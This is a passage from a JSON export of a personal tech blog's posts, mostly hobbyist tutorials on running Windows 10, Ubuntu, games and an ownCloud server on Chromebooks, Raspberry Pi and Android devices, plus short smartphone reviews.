            "dvice",
            "editor",
            "galaxy",
            "nexus",
            "program",
            "python",
            "run",
            "smartphone"
        ]
    },
    {
        "uri": "/would-you-only-buy-a-galaxy-or-iphone/",
        "title": "Would you only buy a Galaxy or iPhone?",
        "content": "Would you only buy a Galaxy or iPhone?\r\n\r\n{{ youtube xel2VBrEkC8 }}\r\n\r\n* *\r\n\r\nSo the other day, I was chatting with my friend about new smartphones. He currently owns the Galaxy S5 and was thinking about either upgrading to the Galaxy S6 or the iPhone. I jokingly informed him that there are other Android smartphone manufacturers such as HTC, LG, Motorola, etc. However he told me, &8220;Dave, honestly, unless it&#8217;s a Galaxy or iPhone, I wouldn&#8217;t consider buying it.&#8221; Of course, at first I assumed his comment came from pure ignorance of the smartphone world. But then, I started to ponder. I wondered how many other people only stick with the devices from either Apple and Samsung and why?\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\n Dave, honestly, unless it&#8217;s a galaxy or iPhone, I wouldn&#8217;t consider buying it\r\n\r\nOf course, this could all be the result of very good marketing. In any case, would you only stick with the Galaxy or iPhone?\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "comparison",
            "galaxy",
            "iphone"
        ]
    },
    {
        "uri": "/windows-10-on-chromebook/",
        "title": "Windows 10 on Chromebook",
        "content": "Yes, you can run Windows 10 on a Chromebook! Now this should not come as too much of a surprise because Chromebooks are pretty much low powered laptops with Chrome OS installed. In addition, Windows 10 is designed to work with devices with lower end specifications. Overall, the performance was fluid. Between browsing through the start menu and opening up Internet Explorer, I did not encounter any issues.\n\n{{ ad }}\n\nThere are some technical things to mention. First off, since my Chromebook (Acer C720) only has 16GB of storage, installing this completely erased Chrome OS. Don&#8217;t worry, there&#8217;s an easy way to get it back. Also, after installing Windows 10 to a bootable USB, I had to make sure the Chromebook was connected to a power source so that it can read the other USB hubs. And speaking of which, you will need a USB hub to get things operational. The keyboard, touch pad and speakers do not currently have any driver support.\n\n p style=\"text-align: center;\"\n   Dave Bennett Demonstrates Windows 10 running on a Chromebook.\n /p\n\ndiv\n/div\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/03/IMG_4945.jpg\n",
        "tags": [
            "chromebook",
            "windows"
        ]
    },
    {
        "uri": "/install-windows-10-on-chromebook/",
        "title": "Install Windows 10 on Chromebook",
        "content": "So let&#8217;s say that you bought a Chromebook and realized just how limiting Chrome OS can be, or perhaps you are perfectly content with Chrome OS but want to do a little more with it.  Whatever your situation may be, I am here to inform you that you can run Windows 10 on your Chromebook. Yes, I am talking about a complete and nearly functional version of Windows 10. In my quick time of using it, I was able to download and play League of Legends (unbearable frame rate though) watch a couple of YouTube videos and use a few lightweight programs. Now I can&#8217;t guarantee you that this solution will provide you with a nice Windows netbook. For one, there are a couple driver issues, mainly the keyboard and track pad. Interestingly, someone is a href=\"https://coolstar.org/chromebook/windows.html\" target=\"_blank\" rel=\"noopener\"working on a fix/a to get it working. So for now you will need to depend on an external keyboard and mouse.\n\n{{ ad }}\n\nTo do this is fairly simple. Before we begin though, you will need to make sure that you have developer mode enabled along with the legacy bios. Check a href=\"https://www.davebennett.tech/enable-developer-mode-on-chromebook/\" target=\"_blank\" rel=\"noopener\"my tutorial /aif you have not done so. Also, we are going to completely wipe Chrome OS, so backup anything that you might want to save. And one last thing, this will only work on Chromebooks running an x86 processor (such as the Intel powered Chromebooks). So here&#8217;s how to install Windows 10 on Chromebook.\n\nIf this method is not working for you, or you want to completely get rid of Chrome OS entirely, a href=\"http://davebennett.tech/replace-chrome-os-with-windows/\" target=\"_blank\" rel=\"noopener\"check out this tutorial./a\n\n What You Will Need:\n\n  Chromebook with at least 16GB Storage\n  Developer Mode Enabled\n  a href=\"http://windows.microsoft.com/en-us/windows/preview-iso\" target=\"_blank\" rel=\"noopener\"Windows 10 Technical Preview /a\n  a href=\"https://rufus.akeo.ie/\" target=\"_blank\" rel=\"noopener\"Rufus/a (Need a Windows Machine to run this)\n  4GB Flash Drive\n\nStep 1: Preperation\n\nFirst, download the Windows 10 iso and install it to a flash drive using the Rufus program. For partition scheme, make sure you select MBR for Bios or UEFI.\n\n Step 2:  Boot\n\nMake sure your Chromebook is powered off, and connected to an external power source. Connect the flash drive to your Chromebook, then power it on. Press CRTL + L on the developer screen to bring up the legacy bios. Hit escape to see the boot options then choose your flash drive from the boot devices.\n\nStep 3: Installing Windows\n\nFrom this point, you will need to make sure that you connect an external mouse and keyboard so that you can navigate around the system. The first order of business is to completely wipe Chrome OS from the disk. On the Windows installation screen go to repair.\n\n{{ ad }}\n\nGo to troubleshoot, advanced and select command prompt. Type in the following:\n\npreDiskpart\n\nList Disk\n\nSelect Disk 0 (this could be different depending on your setup, but most likely will be 0)\n\nclean/pre\n\nThis will format your drive. Then type in exit to exit disk part, and type in exit again to exit command prompt. Then reboot your Chromebook.\n\n Step 4: Finishing Up\n\nAfter your chromebook reboots, go back to the legacy bios and boot from the flash drive again. From this point on, you can install Windows just like a normal installation. Wifi should be functional. If you are on an Acer C720 and you need aduio to work, download and install a href=\"http://goo.gl/Y8zmEe\" target=\"_blank\" rel=\"noopener\"this driver./a If you have any questions or comments feel free to leave them down below.\n\n&nbsp;\n\n [1]: https://www.davebennett.tech/enable-developer-mode-on-chromebook/\n [2]: http://localhost/wordpress/wp-content/uploads/2015/05/rufus.jpg\n [3]: http://localhost/wordpress/wp-content/uploads/2015/05/boot-menu.jpg\n [4]: http://localhost/wordpress/wp-content/uploads/2015/05/command-promt.jpg\n [5]: http://localhost/wordpress/wp-content/uploads/2015/05/install1.jpg\n [6]: http://localhost/wordpress/wp-content/uploads/2015/05/install2.jpg\n [7]: http://localhost/wordpress/wp-content/uploads/2015/05/install3.jpg\n",
        "tags": [
            "chrome os",
            "chromebook",
            "install",
            "windows",
            "windows 10"
        ]
    },
    {
        "uri": "/enable-developer-mode-on-chromebook/",
        "title": "Enable Developer mode on Chromebook",
        "content": "Are you looking to install Linux on your Chromebook or Windows 10? If so, the first thing that you will need to do is enable developer mode on your Chromebook. Also, these instructions could differ depending on your Chromebook model. For this tutorial, I am going to be using the Acer C720.\n\nEnable Developer Mode on Chromebook:\n\nspan style=\"color: ff0000;\"strongemThis process will erase everything on your Chromebook. So backup anything that you might need./em/strong/span\n\nspan style=\"color: 000000;\"Enabling Developer Mode:/span\n\nMake sure your Chromebook is on and logged into your account. Now you will need to reboot into recovery. To do this, while holding down the ESC + Refresh Button, tap the* Power button.*\n\nYou should be rebooted into the recovery. You will see the text, &#8220;Chrome OS is missing or damaged.&#8221; Don&#8217;t worry, nothing is actually missing or damaged.\n\nNext, hit *CRTL + D *to turn off OS verification, then press *Enter *to confirm. Your Chromebook will reboot and begin to factory reset your device. It will reboot again once it&#8217;s done.\n\nFrom now on, when you reboot your Chromebook you will get the recovery screen that says OS Verification is off. You can either wait 30 seconds, to hit CRTL + D, to boot right into Chrome OS.\n\nEnable USB Booting\n\nIf you want to install another operating system such as Android or Windows on your Chromebook, then you will need to enable USB booting. To do it, it&8217;s very easy.\n\nOn the Chrome Login screen, type in CRTL + ALT + F2 (forward arrow) to bring up the console window. For the login, type in root.\n\nThen type in the following:\n\nsudo bash\n\ncrossystem devbootusb=1 devbootlegacy=1\n\nsudo reboot\n\nNow, when the OS verification screen comes up you can hit *CRTL + L * to bring up the legacy bios and boot devices.\n\nThat&#8217;s it. If you have any questions or comments feel free to leave them below.\n\n&nbsp;\n\n&nbsp;\n",
        "tags": [
            "chromebook",
            "developer",
            "enable",
            "linux",
            "mode",
            "ubuntu",
            "windows"
        ]
    },
    {
        "uri": "/counter-strike-global-offensive-on-chromebook/",
        "title": "Counter Strike Global Offensive on Chromebook",
        "content": "{{ youtube qvYVZQPwGxI }}\r\n\r\nCounter Strike Global Offensive on Chromebook? Are you tired of playing the same old games on your Chromebook? Well, with a little help from Linux and Steam you can play CS:Go on your Chromebook. Of course, this will only work with the Intel powered Chromebooks. As far as performance, it&#8217;s playable. On average, I am getting around 23-30 fps in games. It&#8217;s nowhere close to the performance that I get on my desktop, but is still playable none the less.\r\n\r\nInstallation\r\n\r\nFor installation, all I did was installed Steam on Ubuntu that&8217;s running on my Chromebook. I am using the Acer c720, which only has 16gb of storage space. So I connected a flash drive, and changed the steam install location to the directory I mounted the flash drive:\r\n\r\nsudo fdisk -l\r\n\r\nsudo mkdir /mnt/usb\r\n\r\nsudo mount /dev/sdb1 /mnt/usb\r\n\r\nsudo chown -v dave /mnt/usb\r\n\r\nsudo chmod 755 /mnt/usb\r\n",
        "tags": [
            "chrome",
            "chrome os",
            "chromebook",
            "counter",
            "game",
            "linux",
            "steam",
            "strike",
            "ubuntu"
        ]
    },
    {
        "uri": "/install-ubuntu-14-04-on-chromebook/",
        "title": "Install Ubuntu 14.04 on Chromebook",
        "content": "{{ youtube 3u_QolSJYoY }}\r\n\r\nI am always looking for different ways that I can extend the capability of my Chromebook. It&#8217;s not that I don&#8217;t like Chrome OS, but sometimes I need to launch a C compiler or run  java apps when I am away from home. I might even get in the mood to play Minecraft during a long car ride. Luckily, there is an easy answer to all of this. Install Linux on your Chromebook. This might sound very hard and technical, but it&#8217;s not. All of the hard work has been done by a script that automates the process. All you have to do is download the script and run it with your configurations.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nTo do this, you will need to make sure that a href=\"https://www.youtube.com/watch?v=UWXO61_v_xo\" target=\"_blank\"you have developer mode enabled/a on your Chromebook. Check my a href=\"https://www.youtube.com/watch?v=UWXO61v_xo\" target=\"blank\"tutorial/a if you have not done this yet. We are going to be using the popular script called crouton to install Ubuntu on your Chromebook. This will not erase any data, and will allow you to switch back and forth between Chrome OS and Ubuntu.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://goo.gl/fd3zc\" target=\"_blank\"Crouton File/a\r\n  Chromebook\r\n  Internet Connection\r\n\r\n Step 1: Crouton\r\n\r\nOn your Chromebook, download the crouton file. Then open up terminal by typing in CRTL + ALT + T. Inside of terminal type in the following:\r\n\r\nshell\r\n\r\nsudo sh ~/Downloads/crouton -r trusty -t xfce\r\n\r\nTrusty is the version of Ubuntu I am going to download. Of course, you can replace this with any version version of Ubuntu that you desire. Xfce is the desktop environment that I am choosing to use. Again, you are free to choose whatever environment that you desire.\r\n\r\nOptional: Crouton Integration\r\n\r\nIn the Chrome Web store, there&8217;s an extension called a href=\"https://chrome.google.com/webstore/detail/crouton-integration/gcpneefbbnfalgjniomfjknbcgkbijom\" target=\"_blank\"crouton integration/a. Once installed, it will allow you to open up Ubuntu in its own window within Chrome OS. Therefore you could treat it just like any other fullscreen app. The advantage to this is that you can still use all the controls (such as volume and brightness) from Chrome OS inside of Ubuntu. You would also have access to all of your Chrome apps while running Ubuntu. After you download the plugin, install your chroot with the xiwi target:\r\n\r\nsudo sh ~/Downloads/crouton -r trusty -t xfce,xiwi\r\n\r\nIf you already have Crouton installed, you can update it with the integration using the following command:\r\n\r\npresudo sh -e ~/Downloads/crouton -u -t xiwi -r trusty/pre\r\n\r\nStep 2: Setting up Ubuntu\r\n\r\nAfter the installation is complete, you can boot into the graphics by typing in:\r\n\r\nsudo startxfce4\r\n\r\nReplace xfce4 with the desktop environment that you chose. Alternatively, if you just want to enter the chroot without the graphics type in:\r\n\r\nsudo enter-chroot -n trusty\r\n\r\n\r\n\r\nAgain, replace trusty with the Ubuntu distribution that you choose.\r\n\r\nFinally, don&8217;t forget to perform an update on all the packages once your are inside of Ubuntu:\r\n\r\nsudo apt-get update\r\n\r\nsudo apt-get dist-upgrade\r\n\r\nTo install the software center, enter:\r\n\r\nsudo apt-get install software-center\r\n\r\nAnd that&#8217;s it, how to install Ubuntu 14.04 on Chromebook. If you have any questions or comments feel free to leave them below.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/05/startup.jpg\r\n",
        "tags": [
            "chromebook",
            "chroot",
            "crouton",
            "emulaiton",
            "java",
            "linux",
            "minecraft",
            "steam",
            "ubuntu"
        ]
    },
    {
        "uri": "/galaxy-s6-slow-motion-video/",
        "title": "Galaxy S6 Slow Motion Video",
        "content": "{{ youtube i9srWjFM-OQ }}\r\n\r\nSlow Motion seems to be all the rage these days. Every one is trying to do it. It should come as no surprise that the Galaxy S6 also features this. While the Galaxy S6 slow motion video capabilities don&#8217;t exactly rival those of the iPhone, it&#8217;s still pretty good in its own right. In this video, I use the built in slow motion editor. Of course, a much better way would have been to record the video in 60fps then slow it down in Adobe Premiere. The galaxy S6 records slow motion at 120fps.\r\n",
        "tags": [
            "camera",
            "galaxy",
            "motion",
            "review",
            "s6",
            "slow",
            "smartphone",
            "test",
            "video"
        ]
    },
    {
        "uri": "/create-your-own-personal-cloud-server/",
        "title": "Create Your Own Personal Cloud Server",
        "content": "{{ youtube UY2CZc1ul8U }}\r\n\r\nWhether it is Dropbox, Google Drive, Skydrive or iCloud, I am sure that we all have our favorite cloud server. Cloud Servers are great because they allow us to easily sync files between all the devices on our network and access content from anywhere. However, a growing concern over cloud servers is privacy. You could be banned from hosting certain content and companies could easily sort through what you are uploading and create targeted ads based on it. Also, each service provides only a limited amount of free space that is quickly filled.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nWhatever your situation may be, you should try to create your own personal cloud server. It gives you all the privacy that you want and does not limit you in terms of storage. In order to build an effective cloud server you will need a device that can be always on. For this reason, I am going to use the raspberry pi. You can keep it running all year long and it hardly has any noticeable impact on your electric bill. Of course you could also use any desktop computer that you might have sitting around. We are going to use the popular software OwnCloud. Owncloud is very easy to setup, but only works on machines running Linux. However, you can connect a client to any operating System on desktop and mobile.\r\n\r\nWhat You Will Need:\r\n\r\n  A computer running Linux\r\n  Wired or Wireless Network\r\n\r\n Step 1: Static all the way\r\n\r\nFirst you will need to setup a static IP address, so that whenever you access your cloud it will always use the same address. Imagine having 20 clients connected to the server and the address changes; you would have to manually reconnect all of those clients! To do this, you can either go through your router settings (the simplest way) or change the network interfaces. To change the network interface type in:\r\n\r\nifconfig\r\n\r\n\r\n\r\nThis will display the eth0, broadcast and mask address. Take note of all of these. Then to get the internet IP and gateway type in:\r\n\r\nnetstat -nr \r\n\r\n\r\n\r\nMake sure to record this information somewhere. Now go  into network interfaces and fill in the information you obtained. Also remember to change dhcp to static.\r\n\r\nnano /etc/network/interface\r\n\r\n\r\n\r\nType CRTL +O to save and CRTL + X to exit.\r\n\r\nThen reboot your computer/raspberry pi for the changes to take effect.\r\n\r\nStep 2: Packages\r\n\r\nIf you have not already, update your packages.\r\n\r\nsudo apt-get update\r\n\r\nNow, time to download and install a crapload of stuff. Here is what you need (Thanks a href=\"http://www.instructables.com/id/Raspberry-Pi-Owncloud-dropbox-clone/\" target=\"_blank\"inscrutables /afor providing all of this on one line):\r\n\r\nsudo apt-get install apache2 php5 php5-json php5-gd php5-sqlite curl libcurl3 libcurl4-openssl-dev php5-curl php5-gd php5-cgi php-pear php5-dev build-essential libpcre3-dev php5 libapache2-mod-php5 php-apc gparted\r\n\r\nStep 3: PHP Accelerator\r\n\r\nTo make things go a little faster, you are going to want to install the PHP accelerator:\r\n\r\nsudo pecl install apc\r\n\r\n\r\n\r\nJust hit enter to use the default options for everything it asks.\r\n\r\n Step 4: Max Defaults:\r\n\r\nNow let&#8217;s set the max file upload and post size. Type in:\r\n\r\nnano /etc/php5/apache2/php.ini \r\n\r\n\r\n\r\nThen change the max upload size to whatever you desire. I am going to use 4096M (4 GB). Do the same for the max post size.  Then go to the part of the file that says extensions and add in the following:\r\n\r\n extension=apc.so\r\n\r\n\r\n\r\nThen close and save the file (CRTL + O and CRL + X).\r\n\r\nStep 5: SSL\r\n\r\nNext you need to setup the SSL certificate.\r\n\r\nsudo nano  /etc/apache2/sites-enabled/000-default \r\n\r\n\r\n\r\ndiv\r\n  And change the AllowOvveride from None to All. Then type in the following commands:\r\n/div\r\n\r\ndiv\r\n  p\r\n    codesudo a2enmod rewrite sudo a2enmod headers/code\r\n  /p\r\n  \r\n  p\r\n    Good. You&8217;re almost done with apache. Now the next steps will pretty much get all the necessary information to sign the key. It was also asks for things such as your name, email, etc. It will also ask you to make a password. (Again, thanks instructables).\r\n  /p\r\n  \r\n  p\r\n    codesudo openssl genrsa -des3 -out server.key 1024; sudo openssl rsa -in server.key -out server.key.insecure;sudo openssl req -new -key server.key -out server.csr;sudo openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt;sudo cp server.crt /etc/ssl/certs;sudo cp server.key /etc/ssl/private;sudo a2enmod ssl;sudo a2ensite default-ssl/code\r\n  /p\r\n  \r\n  p\r\n    Afterwards, restart the apache server:code&lt;br /\r\nservice apache2 reload&lt;br /\r\n/code\r\n  /p\r\n/div\r\n\r\nStep 6: Setting up Owncloud\r\n\r\nNow, time to download and setup owncloud. To download tpye in:\r\n\r\nwget a href=\"https://download.owncloud.org/community/owncloud-8.0.3.tar.bz2\"https://download.owncloud.org/community/owncloud-8.0.3.tar.bz2/a\r\n\r\ndiv\r\n/div\r\n\r\nThen unzip it:\r\n\r\n sudo tar -xfj owncloud....\r\n\r\ndiv\r\n/div\r\n\r\nAnd move it to the web root:\r\n\r\ndiv\r\n  p\r\n    codesudo cp -r owncloud /var/www/code\r\n  /p\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\nFinally, change the ownership:\r\n\r\n sudo chown -R www-data:www-data /var/www/owncloud/\r\n\r\ndiv\r\n/div\r\n\r\nNow, change the htcaccess file in the web root to match the upload size that you specified earlier:\r\n\r\n sudo nano /var/www/owncloud/.htaccess\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n\r\n/div\r\n\r\nRemember to save the file.\r\n\r\n Step 7: Storage\r\n\r\nIf you have not already, connect the device that you are using for storage. I am connecting a 500GB hard drive to my raspberry pi. Using the program GParted (or whatever partition software you desire) format and partition the drive. It does not matter whether you use EXT 3/4 or NTFS.\r\n\r\n\r\n\r\nNow mount the drive. My drive is listed as sda2 but your drive letter might be different. Make sure to check with fdisk -l.\r\n\r\nmkdir /mnt/cloudDrive\r\n\r\nmount /dev/sda2 /mnt/cloudDrive\r\n\r\nNow, let&#8217;s make some edits so that it will automatically mount on boot. Type in:\r\n\r\nsudo nano /etc/fstab\r\n\r\nAdd the drive followed by the mount directory along with 0 0 for the defaults.\r\n\r\n\r\n\r\nStep 8: Logging In\r\n\r\nYou can now log in to your owncloud server. In any browser, type in the IP address of the computer that owncloud is running on. It will prompt you to create a username and password.\r\n\r\n\r\n\r\n Step 9: One last thing\r\n\r\nThere is one small thing that we have to do before we are done. We have to point tot he drive that we want to contain the data for owncloud. First, stop the web service:\r\n\r\nsudo /etc/init.d/apache2 stop\r\n\r\nThen navigate to the owncloud config file:\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n  codecd /var/www/owncloud/config/code\r\n/div\r\n\r\ndiv\r\n  codenano config.php/code\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\nIn the data directory, specify the directory that you want to use. I am going to point to a folder that does not exist yet. Finally, move all the existing content to that subfolder.\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n  codemv /var/www/owncloud/data /mnt/cloudDrive/data/code\r\n/div\r\n\r\ndiv\r\n  codesudo chown -R www-data: ww-data /mnt/cloudDrive/data/code\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\nStep 10: Finish\r\n\r\nAnd you are done. All that is left is to isntall clients on your Windows, Mac, Linux or Android device and connect to the server. If you want to connect to the server outside of your local network than use port-forwarding or setup a VPN. If you have any questions or comments feel free to leave them below.\r\n\r\ndiv\r\n\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n  sources:\r\n/div\r\n\r\ndiv\r\n  a href=\"http://www.modmypi.com/blog/tutorial-how-to-give-your-raspberry-pi-a-static-ip-address\" target=\"_blank\"http://www.modmypi.com/blog/tutorial-how-to-give-your-raspberry-pi-a-static-ip-address/a\r\n/div\r\n\r\ndiv\r\n  a href=\"http://www.linuxuser.co.uk/tutorials/raspberry-pi-private-cloud\" target=\"_blank\"http://www.linuxuser.co.uk/tutorials/raspberry-pi-private-cloud/a\r\n/div\r\n\r\ndiv\r\n  a href=\"http://www.instructables.com/id/Raspberry-Pi-Owncloud-dropbox-clone/?ALLSTEPS\" target=\"_blank\"http://www.instructables.com/id/Raspberry-Pi-Owncloud-dropbox-clone/?ALLSTEPS/a\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/05/config.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/05/netstat.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/05/interface2.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/05/php-aceeleora.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/05/extension.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2015/05/ovverride.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2015/05/gparted.jpg\r\n [8]: http://localhost/wordpress/wp-content/uploads/2015/05/fstab.jpg\r\n [9]: http://localhost/wordpress/wp-content/uploads/2015/05/owcloud-login.jpg\r\n",
        "tags": [
            "cloud",
            "host",
            "linux",
            "make",
            "owncloud",
            "pi",
            "raspberry",
            "tutorial",
            "web"
        ]
    },
    {
        "uri": "/run-minecraft-server-on-android/",
        "title": "Run Minecraft Server on Android",
        "content": "{{ youtube UY2CZc1ul8U }}\r\n\r\nHere is how you can run Minecraft server on your Android device. This will allow anyone playing Minecraft on the desktop to connect to the server running on your device. To do this, you will first need to install Linux to your Android device then install java and run the Minecraft server jar file. It is actually a fairly easy process and takes no more than 15 minutes altogether.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nOf course, you will need to have a rooted Android phone in order to do this. I would also like to mention that there is a Minecraft server app called a href=\"https://code.google.com/p/mc-server/downloads/detail?name=MCServerr1117Signed.apk\" target=\"_blank\"MCServer/a that does not require any root permissions. The only problem is that this app has not been updated for over 3 years. So it does not work with any of the latest Minecraft clients.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  Rooted Android Device\r\n  a href=\"https://play.google.com/store/apps/details?id=ru.meefik.linuxdeploy\" target=\"_blank\"Linux Deploy/a\r\n  a href=\"http://forum.xda-developers.com/showthread.php?t=2524485\" target=\"_blank\"SE Linux Mode Changer (only Android 5.0+)/a\r\n  a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk7-arm-downloads-2187468.html\" target=\"_blank\"Oracle Jdk 7 for ARM/a\r\n  a href=\"https://minecraft.net/download\" target=\"_blank\"Minecraft Server Jar/a\r\n\r\n Step 1: Linux Linux Linux!\r\n\r\nOkay, so the first thing you need to do is install Linux on your phone. I am not going to go in depth because I made a a href=\"https://www.youtube.com/watch?v=v2R0Wznbn2Y\" target=\"_blank\"video tutorial/a that covers all the details. Just make sure that you set the user as root and enable the SSH and VNC services at boot. I am going to be working with Linux through an SSH client on my desktop, however, you can do it through VNC and SSH or terminal on your Android device. For this tutorial, I am going to install debian wheezy.\r\n\r\n\r\n\r\nAlso, if you are running Andorid 5.0 or higher, you will need to download the SE Linux Changer app and change your mode to permissive!\r\n\r\n\r\n\r\nStep 2: Update and Install\r\n\r\nAfter you have Linux setup type in:\r\n\r\nsudo apt-get update\r\n\r\nIf you are running debian, download the epiphany browser.\r\n\r\nsudo apt-get install epiphany-browser\r\n\r\n\r\n\r\n Step 3: Java\r\n\r\nNow it is time to download Java. We are going to use oracle&#8217;s java because it seems to work better for the Minecraft server than openJDK. Download java from the link above and unzip the archieve.  To keep things simple, we are not going to set up any global PATH variable. We will just simply put the Minecraft jar file in the bin folder.\r\n\r\nStep 4: Minecraft\r\n\r\nNow download the Minecraft server jar file and transfer it to the bin of your java folder.  To start it type in:\r\n\r\n./java -Xmx256M -Xms256M -jar minecraft_server.jar nogui\r\n\r\n\r\n\r\nYou can change the 256M to a higher value if you wish, just be aware that it might cause the server to crash. When you first run it, it will prompt you to sign the eula.txt located in the same folder as the server. Simply go in using nano or any text editor and change false to true. Then type the above command again. You might see a few Java errors, but afterwards it will begin to load the spawn area.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\n Step 5: Connect\r\n\r\nUsing Minecraft on your desktop, you can connect by going to multiplayer and adding a new server. Use your phone&#8217;s iP address on your wireless network followed by the port. (Usually 25565).\r\n\r\n\r\n\r\nAnd hopefully you should be up and running on Minecraft. As far as performance, it is decent and playable. I was only able to test it with one client so I don&#8217;t know how well it would handle under a large load.\r\n\r\n\r\n\r\nFeel free to leave any questions or comments.\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/05/Screenshot_2015-05-18-00-03-09.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/05/Screenshot_2015-05-18-00-03-41.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000300_06.Still001.jpg\r\n [4]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000623_07.Still003.jpg\r\n [5]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000656_02.Still004.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000726_01.Still005.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000754_23.Still006.jpg\r\n [8]: http://localhost/wordpress/wp-content/uploads/2015/05/main-video.000819_08.Still007.jpg\r\n",
        "tags": [
            "android",
            "emulation",
            "game",
            "linux",
            "minecraft",
            "root",
            "run",
            "server"
        ]
    },
    {
        "uri": "/windows-xp-on-android-wear-smartwatch/",
        "title": "Windows XP on Android Wear Smartwatch",
        "content": "{{ youtube UY2CZc1ul8U }}\r\n\r\nAlan Turing, the great father of computer science, had once said that, &#8220;Machines take me by surprise with great frequency.&#8221; I think we could all relate to that statement in one way or another. From the age of early gaming, to the development of PDA&#8217;s, Smartphones, Smartwatches and even Smart Glasses, there never seems to be a point where technology fails to impress us. What is even more astonishing is how outdated technology can easily become to us within a small amount of time. Windows XP is arguably one of the best operating systems Microsoft has ever offered, and at one point, nearly everyone was running it. Now fast forward to 2015, and this amazing operating system can easily be emulated by a device no bigger than a  2 inch square. It is for this reason that I find the idea of emulating so amazing. It shows just how far technology has advanced, even if it has only been a decade since the XP days.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nOkay enough rambling, let us talk about Windows XP running on an Android Wear Smartwtach. I performed this whole procedure on my LG G Watch. If you have watched or read any of my previous Windows XP on Android tutorials, this is no different. Basically, I installed the bochs emulator to the watch then transferred my Windows XP disk image. I used a program called WinBuilder to make a very small image of Windows XP that is only 100MB in size with minimal graphics. The full installation of WIndows XP is about 1.5GB, and to transfer that over bluetooth with adb to my smartwatch would have been an all day process. Also, by using a minimal version it speeds up the boot process. All in all, Windows XP boots properly on the G Watch. Of course there is no keyboard, so there is really nothing that I could do with it.  As to be expected, the performance is less than desriable. In any case, this is a cool proof of concept to highlight just how far technology has come in emulation software and processing capabilities.\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "android wear",
            "emulation",
            "lg g watch",
            "tutorial",
            "windows",
            "xp"
        ]
    },
    {
        "uri": "/lg-g4-gaming-performance/",
        "title": "LG G4 Gaming Performance",
        "content": "{{ youtube o5Ka-wVYTxo }}\r\n\r\nLG G4 Gaming Performance:\r\n\r\nHere is a quick look at the LG G4 gaming performance. If you are worried with LG&8217;s decision to use the Snapdragon 808 over the Snapdragon 810, don&#8217;t be. In my testing, I used graphics heavy games such as GTA Vice City and Goat Simulator along with Real Racing 3. I could not get the device to lag, even with all the in game settings set to the max. That doesn&#8217;t mean that the 808 is invincible, but in real world usage, you will likely not even notice the difference between the 808 and 810. Only in benchmarks will the Snapdragon 808&#8217;s weaknesses become noticeable. It&#8217;s also worth noting that the 808 will not run super hot and burn your hands off, unlike the early builds of the Snapdragon 810.\r\n",
        "tags": [
            "android",
            "benchmark",
            "device",
            "g4",
            "gaming",
            "lg",
            "performance",
            "review",
            "smartphone"
        ]
    },
    {
        "uri": "/how-to-play-ps2-games-on-chromebook/",
        "title": "How to Play PS2 Games on Chromebook",
        "content": "{{ youtube WbiInD2oB5I }}\r\n\r\nI always said to never underestimate the power of Chromebooks, and here is another reason not to. You can play play PlayStation 2 Games on your Chromebook. In order to do this, you will need to have **a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"strongLinux/strong/a a href=\"http://www.davebennett.tv/install-ubuntu-14-04-on-chromebook/\" target=\"_blank\"installed on your Chromebook/a.  **We are going to use the popular PCSX2 emulator for Linux. So it&#8217;s also important that you have an Intel powered chromebook.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nNow, one word of advice. You are going to need to be realistic about the games that you want to emulate. Emulating advance 3D games with work, but you are going to average about 10fps (like I did in Jack and Dexter). You should get better performance with 2D games. Also, if you&#8217;re using something fancy like the Chromebook pixel, you performance will obviously be leaps and bounds better over the acer C720 or other Chromebooks of the like. Okay enough talking, let&#8217;s get to play ps2 games on chromebook.\r\n\r\nWhat You Will Need:\r\n\r\n  Intel Powered Chromebook\r\n  A Playstation 2 Game ISO\r\n  Playstation 2 Bios file\r\n\r\n Step 1: Updating and Repository\r\n\r\nLaunch Ubuntu on 